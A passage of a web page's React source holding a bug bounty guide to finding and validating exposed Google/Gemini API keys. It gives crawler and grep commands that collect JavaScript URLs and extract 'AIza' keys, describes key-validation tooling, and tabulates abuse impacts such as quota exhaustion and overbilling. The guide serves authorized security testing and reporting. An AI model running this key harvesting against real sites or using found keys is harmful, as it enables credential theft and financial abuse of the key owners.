              </div>
              <div>
                <span className="text-xs font-medium text-primary">Phase 7</span>
                <h2 className="text-2xl font-bold text-foreground">The Automation Tool: Full Workflow at Scale</h2>
              </div>
            </div>
            <p className="mb-4 text-muted-foreground leading-relaxed">
              Manually searching GitHub is slow and difficult to scale. To stay competitive in bug bounty hunting, you need automation for both discovery and validation. That&apos;s why I built a tool that automates the entire process, making API key hunting much faster, easier, and more accurate.
            </p>

            <div className="mb-8 overflow-hidden rounded-lg border border-border cursor-pointer" onClick={() => setExpandedImg("/images/cloud/google-api-keys/1_33tCVk5riDeb7iz5bXXjPA.webp")}>
              <Image src="/images/cloud/google-api-keys/1_33tCVk5riDeb7iz5bXXjPA.webp" alt="Automation tool overview" width={600} height={338} className="w-full" style={{ height: "auto" }} unoptimized />
            </div>

            <h3 className="mb-3 text-lg font-semibold text-foreground">Tooling Workflow:</h3>

            <h4 className="mb-2 font-medium text-foreground">Mode 1 — Single Domain</h4>
            <p className="mb-3 text-sm text-muted-foreground">
              Crawls a target domain, extracts API keys from page source and linked JavaScript files, validates Gemini access and can optionally run a full capability check on discovered keys.
            </p>
            <div className="mb-6 overflow-hidden rounded-lg border border-border cursor-pointer" onClick={() => setExpandedImg("/images/cloud/google-api-keys/1_BCQz_zuQKrvXmyWcp4hUkQ.webp")}>
              <Image src="/images/cloud/google-api-keys/1_BCQz_zuQKrvXmyWcp4hUkQ.webp" alt="Mode 1 — Single domain scan" width={600} height={338} className="w-full" style={{ height: "auto" }} unoptimized />
            </div>

            <h4 className="mb-2 font-medium text-foreground">Mode 3 — Direct JS URL List</h4>
            <p className="mb-3 text-sm text-muted-foreground">
              Skips crawling completely and scans a pre-collected list of JavaScript file URLs directly. This is much faster when you&apos;ve already gathered assets using tools like GoSpider or Katana, while also reducing false positives significantly.
            </p>
            <div className="space-y-2">
              <CommandCard
                command={`katana -u target.com -d 2 | grep '\.js$' > jsUrls.txt`}
                description="Collect JS URLs with Katana"
                index={19}
              />
              <CommandCard
                command={`gospider -s https://target.com -d 2 | grep '\.js$' | grep -Eo 'https?://[^"'<>[:space:]]+' > jsUrls.txt`}
                description="Collect JS URLs with GoSpider"
                index={20}
              />
            </div>

            <div className="mt-4 grid gap-4 sm:grid-cols-2">
              <div className="overflow-hidden rounded-lg border border-border cursor-pointer" onClick={() => setExpandedImg("/images/cloud/google-api-keys/1_yz47BSrN2SE68j3aN4FFtg.webp")}>
              <Image src="/images/cloud/google-api-keys/1_yz47BSrN2SE68j3aN4FFtg.webp" alt="Katana JS URL collection" width={600} height={338} className="w-full" style={{ height: "auto" }} unoptimized />
            </div>
              <div className="overflow-hidden rounded-lg border border-border cursor-pointer" onClick={() => setExpandedImg("/images/cloud/google-api-keys/1_6hzJ0bacGbYDkpgLY8Dpew.webp")}>
              <Image src="/images/cloud/google-api-keys/1_6hzJ0bacGbYDkpgLY8Dpew.webp" alt="GoSpider JS URL collection" width={600} height={338} className="w-full" style={{ height: "auto" }} unoptimized />
            </div>
            </div>

            <h4 className="mb-2 mt-8 font-medium text-foreground">Extracting Keys from Results Files</h4>
            <p className="mb-3 text-sm text-muted-foreground">
              Before moving to the next tool, you first need to extract only the Gemini API keys from the Gemisc.py results file.
            </p>
            <div className="space-y-2">
              <CommandCard
                command="cat results.txt | grep -o 'AIza[0-9A-Za-z_-]*' > api_keys.txt"
                description="Extract keys via regex"
                index={21}
              />
              <CommandCard
                command="cat results.txt | awk '/KEY:/ {print \$2}' > api_keys.txt"
                description="Extract keys from KEY: output format"
                index={22}
              />
            </div>

            <div className="mt-4 overflow-hidden rounded-lg border border-border cursor-pointer" onClick={() => setExpandedImg("/images/cloud/google-api-keys/1_9wd9azK8PyihY0FWSs-vxQ.webp")}>
              <Image src="/images/cloud/google-api-keys/1_9wd9azK8PyihY0FWSs-vxQ.webp" alt="Key extraction results" width={600} height={338} className="w-full" style={{ height: "auto" }} unoptimized />
            </div>
          </section>

          {/* Phase 8 — Beyond Gemini */}
          <section id="phase-8-beyond-gemini" className="scroll-mt-24">
            <div className="mb-6 flex items-center gap-3">
              <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-primary/10 text-primary">
                <Search className="h-5 w-5" />
              </div>
              <div>
                <span className="text-xs font-medium text-primary">Phase 8</span>
                <h2 className="text-2xl font-bold text-foreground">Testing Beyond Gemini</h2>
              </div>
            </div>
            <p className="mb-4 text-muted-foreground leading-relaxed">
              Just because a key fails Gemini validation doesn&apos;t mean it&apos;s useless. The AIza format is used across many Google services.
            </p>
            <div className="overflow-hidden rounded-lg border border-border cursor-pointer" onClick={() => setExpandedImg("/images/cloud/google-api-keys/1_DrRzgLMiCYYVzglVcl4TGw.webp")}>
              <Image src="/images/cloud/google-api-keys/1_DrRzgLMiCYYVzglVcl4TGw.webp" alt="Testing beyond Gemini" width={600} height={338} className="w-full" style={{ height: "auto" }} unoptimized />
            </div>
          </section>

          {/* Financial Impact & Reporting */}
          <section id="reporting" className="scroll-mt-24">
            <div className="mb-6 flex items-center gap-3">
              <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-primary/10 text-primary">
                <DollarSign className="h-5 w-5" />
              </div>
              <div>
                <span className="text-xs font-medium text-primary">Reporting</span>
                <h2 className="text-2xl font-bold text-foreground">Financial Impact and Reporting</h2>
              </div>
            </div>
            <p className="mb-4 text-muted-foreground leading-relaxed">
              A report that moves through triage quickly and earns appropriate severity has three components beyond &ldquo;here&apos;s the key&rdquo;:
            </p>
            <ul className="mb-6 space-y-3 text-muted-foreground">
              <li className="flex items-start gap-2">
                <span className="flex h-6 w-6 shrink-0 items-center justify-center rounded-full bg-primary/10 text-xs font-bold text-primary">1</span>
                <span><strong className="text-foreground">Exact source.</strong> The full GitHub URL or live target JS bundle URL where the key was found. Include the line number if possible. Triage teams verify the exposure is real before anything else.</span>
              </li>
              <li className="flex items-start gap-2">
                <span className="flex h-6 w-6 shrink-0 items-center justify-center rounded-full bg-primary/10 text-xs font-bold text-primary">2</span>
                <span><strong className="text-foreground">Validate access.</strong> Prove the key is active by querying the models endpoint. Then demonstrate capability through controlled PoC.</span>
              </li>
              <li className="flex items-start gap-2">
                <span className="flex h-6 w-6 shrink-0 items-center justify-center rounded-full bg-primary/10 text-xs font-bold text-primary">3</span>
                <span><strong className="text-foreground">Frame the vulnerability around real impact.</strong> Use official Gemini pricing data to show potential financial risk.</span>
              </li>
            </ul>

            {/* Impact Table */}
            <div className="mb-6 overflow-hidden rounded-lg border border-border">
              <table className="w-full text-left text-sm">
                <thead>
                  <tr className="border-b border-border bg-muted">
                    <th className="px-4 py-3 font-semibold text-foreground">Risk Vector</th>
                    <th className="px-4 py-3 font-semibold text-foreground">Technical Exposure</th>
                    <th className="px-4 py-3 font-semibold text-foreground">Business Impact</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-border">
                  <tr>
                    <td className="px-4 py-3 font-medium text-foreground">Quota Exhaustion</td>
                    <td className="px-4 py-3 text-muted-foreground">Flooding text and media endpoints with automated requests.</td>
                    <td className="px-4 py-3 text-muted-foreground">Denial of service for production applications using the API.</td>
                  </tr>
                  <tr>
                    <td className="px-4 py-3 font-medium text-foreground">Financial Overbilling</td>
                    <td className="px-4 py-3 text-muted-foreground">Generating video or image assets through Veo/Imagen models.</td>
                    <td className="px-4 py-3 text-muted-foreground">Massive spikes in Google Cloud billing costs.</td>
                  </tr>
                  <tr>
                    <td className="px-4 py-3 font-medium text-foreground">Data Abuse</td>
                    <td className="px-4 py-3 text-muted-foreground">Unauthenticated access to File and Corpora endpoints.</td>
                    <td className="px-4 py-3 text-muted-foreground">Data exposure, unauthorized hosting, or stored data abuse.</td>
                  </tr>
                </tbody>
              </table>
            </div>

            <div className="flex flex-wrap gap-4">
              <a
                href="https://ai.google.dev/gemini-api/docs/pricing"
                target="_blank"
                rel="noopener noreferrer"
                className="inline-flex items-center gap-2 rounded-lg bg-card border border-border px-4 py-2 text-sm text-foreground hover:border-primary/50"
              >
                <BookOpen className="h-4 w-4" />
                Gemini API Pricing
                <ExternalLink className="h-3 w-3" />
              </a>
              <a
                href="https://trufflesecurity.com/blog/google-api-keys-werent-secrets-but-then-gemini-changed-the-rules"
                target="_blank"
                rel="noopener noreferrer"
                className="inline-flex items-center gap-2 rounded-lg bg-card border border-border px-4 py-2 text-sm text-foreground hover:border-primary/50"
              >
                <BookOpen className="h-4 w-4" />
                Truffle Security — Gemini Changed the Rules
                <ExternalLink className="h-3 w-3" />
              </a>
              <a
                href="https://www.youtube.com/watch?v=3KMUnLdlOSE"
                target="_blank"
                rel="noopener noreferrer"
                className="inline-flex items-center gap-2 rounded-lg bg-card border border-border px-4 py-2 text-sm text-foreground hover:border-primary/50"
              >
                <Video className="h-4 w-4" />
                Full Practical Video
                <ExternalLink className="h-3 w-3" />
              </a>
            </div>
          </section>

          {/* Conclusion */}
          <section className="scroll-mt-24">
            <div className="rounded-xl border border-primary/20 bg-gradient-to-br from-primary/5 via-background to-accent/5 p-8">
              <h2 className="mb-4 text-2xl font-bold text-foreground text-center">Conclusion</h2>
              <p className="text-center text-muted-foreground leading-relaxed max-w-3xl mx-auto">
                Exposed Google API keys might look like small mistakes, but they can lead to real impact when tested properly. If you focus on validation, safe proof of concept and clear reporting, these findings can turn into solid bug bounty results. Keep your workflow simple, stay within scope and always prioritize responsible testing.
              </p>
            </div>
          </section>

          {/* Tools & Resources */}
          <section className="scroll-mt-24">
            <div className="mb-6 flex items-center gap-3">
              <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-primary/10 text-primary">
                <ExternalLink className="h-5 w-5" />
              </div>
              <div>
                <span className="text-xs font-medium text-primary">Tools</span>
                <h2 className="text-2xl font-bold text-foreground">Tools & Resources</h2>
              </div>
            </div>
            <div className="grid gap-3 sm:grid-cols-2">
              <a href="https://github.com/njcve/gkey-burp" target="_blank" rel="noopener noreferrer"
                className="group flex items-start gap-3 rounded-lg border border-border bg-card p-4 transition-all hover:border-primary/50 hover:shadow-lg hover:shadow-primary/5">
                <div className="flex h-8 w-8 shrink-0 items-center justify-center rounded-md bg-primary/10 text-primary">
                  <Bug className="h-4 w-4" />
                </div>
                <div className="min-w-0 flex-1">
                  <div className="font-medium text-foreground group-hover:text-primary">GKey Burp Extension</div>
                  <p className="mt-1 text-sm text-muted-foreground line-clamp-2">Automated Gemini API key discovery and validation through Burp Suite proxy</p>
                </div>
              </a>
              <a href="https://github.com/streaak/keyhacks" target="_blank" rel="noopener noreferrer"
                className="group flex items-start gap-3 rounded-lg border border-border bg-card p-4 transition-all hover:border-primary/50 hover:shadow-lg hover:shadow-primary/5">
                <div className="flex h-8 w-8 shrink-0 items-center justify-center rounded-md bg-primary/10 text-primary">
                  <Key className="h-4 w-4" />
                </div>
                <div className="min-w-0 flex-1">
                  <div className="font-medium text-foreground group-hover:text-primary">Keyhacks</div>
                  <p className="mt-1 text-sm text-muted-foreground line-clamp-2">Validate 50+ types of exposed API keys with test commands</p>
                </div>
              </a>
            </div>
          </section>

          {/* Footer */}
          <footer className="border-t border-border pt-8 text-center">
            <p className="text-sm text-muted-foreground">
              This guide is for ethical use and authorized penetration testing only
            </p>
          </footer>
        </div>
      </main>

      {/* Lightbox Overlay */}
      {expandedImg && (
        <div
          className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 p-4 backdrop-blur-sm"
          onClick={() => setExpandedImg(null)}
        >
          <button
            onClick={() => setExpandedImg(null)}
            className="absolute right-4 top-4 flex h-10 w-10 items-center justify-center rounded-full bg-black/50 text-white text-xl hover:bg-black/70"
          >
            ✕
          </button>
          <Image
            src={expandedImg}
            alt="Expanded view"
            width={1200}
            height={675}
            className="max-h-[90vh] max-w-[95vw] rounded-lg object-contain"
            unoptimized
            onClick={(e) => e.stopPropagation()}
          />
        </div>
      )}
    </div>
  )
}




